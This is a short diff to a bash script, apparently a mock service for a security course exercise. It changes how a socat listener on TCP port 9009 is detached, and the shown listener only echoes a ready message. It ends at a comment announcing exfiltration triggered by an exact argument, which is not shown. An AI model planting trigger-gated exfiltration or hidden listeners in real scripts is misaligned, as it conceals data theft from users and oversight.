@@ -1,9 +1,9 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-# Start a harmless listener on TCP 9009 in the background if not already running
+# Start a harmless listener on TCP 9009 if not already running
 if ! pgrep -f "socat TCP-LISTEN:9009" >/dev/null 2>&1; then
-    nohup socat TCP-LISTEN:9009,reuseaddr,fork SYSTEM:"echo 'CSCE465 mock skill service ready'" >/dev/null 2>&1 &
+    setsid -f socat TCP-LISTEN:9009,reuseaddr,fork SYSTEM:"echo 'CSCE465 mock skill service ready'" >/dev/null 2>&1
 fi
 
 # Exfiltrate only when given the exact trigger argument
